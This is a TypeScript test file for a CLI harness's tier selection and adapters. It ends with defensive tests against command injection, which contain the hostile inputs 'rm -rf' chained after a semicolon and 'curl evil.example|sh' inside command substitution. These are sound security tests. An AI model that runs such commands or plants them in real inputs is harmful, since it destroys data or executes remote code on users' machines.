/**
 * Integration tests for CLI harness tier selection and adapters.
 *
 * Covers [R5.2, R5.6, R5.8]:
 *   - Tier selection priority: project > cmux > tmux > node-pty
 *   - All tiers fail → INCONCLUSIVE
 *   - Controllers attempted recorded correctly
 *   - Each adapter returns graceful failure when unavailable
 *
 * **Validates: Requirements R5.2, R5.6, R5.8**
 */

import { describe, expect, it } from "vitest";
import { runCliHarness } from "../src/cli-harness.js";

describe("CLI harness tier selection [R5.2, R5.8]", () => {
  it("returns a valid verdict with attempted controllers", async () => {
    const result = await runCliHarness({
      topic: "test-tier-selection",
      targetCommand: "echo hello",
    });

    // Forge project itself has e2e tests, so project tier may be detected
    expect(["INCONCLUSIVE", "VERIFIED", "NOT_VERIFIED"]).toContain(result.verdict);
    expect(result.controllersAttempted.length).toBeGreaterThan(0);
  });

  it("records attempted controllers with reasons", async () => {
    const result = await runCliHarness({
      topic: "test-attempted",
      targetCommand: "echo hello",
    });

    for (const attempt of result.controllersAttempted) {
      expect(attempt.tier).toBeDefined();
      expect(attempt.reason).toBeDefined();
      expect(typeof attempt.reason).toBe("string");
    }
  });

  it("never throws even with invalid command", async () => {
    await expect(
      runCliHarness({
        topic: "test-invalid",
        targetCommand: "",
      }),
    ).resolves.toBeDefined();
  });
});

describe("CLI harness adapter graceful failure [R5.6]", () => {
  it("cmux adapter returns failure when socket unavailable", async () => {
    const { runCmuxHarness } = await import("../src/harness-cmux.js");
    const result = await runCmuxHarness({
      targetCommand: "echo hello",
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBeDefined();
  });

  it("tmux adapter returns failure when tmux unavailable or command fails", async () => {
    const { runTmuxHarness } = await import("../src/harness-tmux.js");
    const result = await runTmuxHarness({
      targetCommand: "echo hello",
    });
    // Either succeeds (tmux available) or fails gracefully
    expect(typeof result.ok).toBe("boolean");
    if (!result.ok) {
      expect(result.reason).toBeDefined();
    }
  });

  it("pty adapter runs command and captures output", async () => {
    const { runPtyHarness } = await import("../src/harness-pty.js");
    const result = await runPtyHarness({
      targetCommand: "echo hello-pty-test",
    });
    expect(result.ok).toBe(true);
    expect(result.stdout).toContain("hello-pty-test");
    expect(result.exitCode).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Audit P1-1 / P3-latent-A (2026-07-16): harness command-injection guard.
// These harnesses splice targetCommand into bash -c / sh -c. Although the CLI
// harness is currently dead code (runCliHarness has no production wiring),
// guard now so re-wiring can't activate a latent injection surface (SR-2).
// ---------------------------------------------------------------------------

describe("audit: tmux/pty harness reject shell-metachar commands (injection guard)", () => {
  it("runTmuxHarness refuses a targetCommand with shell operators", async () => {
    const { runTmuxHarness } = await import("../src/harness-tmux.js");
    const result = await runTmuxHarness({
      targetCommand: "echo hi; rm -rf /nonexistent-probe",
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/meta|inject|shell|unsafe|reject/i);
  });

  it("runPtyHarness refuses a targetCommand with command substitution", async () => {
    const { runPtyHarness } = await import("../src/harness-pty.js");
    const result = await runPtyHarness({
      targetCommand: "echo $(curl evil.example|sh)",
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/meta|inject|shell|unsafe|reject/i);
  });

  it("runPtyHarness still accepts a simple command without metacharacters", async () => {
    const { runPtyHarness } = await import("../src/harness-pty.js");
    const result = await runPtyHarness({ targetCommand: "echo safe-command" });
    expect(result.ok).toBe(true);
  });
});
